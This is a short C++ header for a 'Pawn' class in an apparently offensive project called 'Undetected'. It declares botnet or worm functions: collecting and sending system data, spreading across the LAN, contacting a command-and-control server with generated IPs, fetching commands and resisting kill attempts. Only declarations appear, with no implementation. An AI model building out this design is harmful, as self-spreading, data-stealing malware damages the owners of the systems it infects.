//
// Created by nn5h on 7/23/19.
//

#ifndef UNDETECTED_PAWN_H
#define UNDETECTED_PAWN_H

#include "CollectSystemData.h"
#include "shared/NetworkOperations.h"
#include "shared/Helper.h"
#include "shared/PRNG.h"
#include <tgmath.h>
#include <fmt/printf.h>


class Pawn {

public:
    SystemDataCollector sdc;
    PRNG gen;
    std::string CC;
    std::vector<std::string> LAN;

    Pawn();
    ~Pawn();

    bool sendMySelfData();
    bool spread();
    bool checkSWKill();
    bool sendData2IP();
    std::string generateCCIP(std::string lowBound, std::string highBound);
    std::string getCommand();
    std::vector<std::string> discoverLAN();
    void doWork();
    bool isRealCC(std::string possibleCC);
    void preventKill();
};


#endif //UNDETECTED_PAWN_H
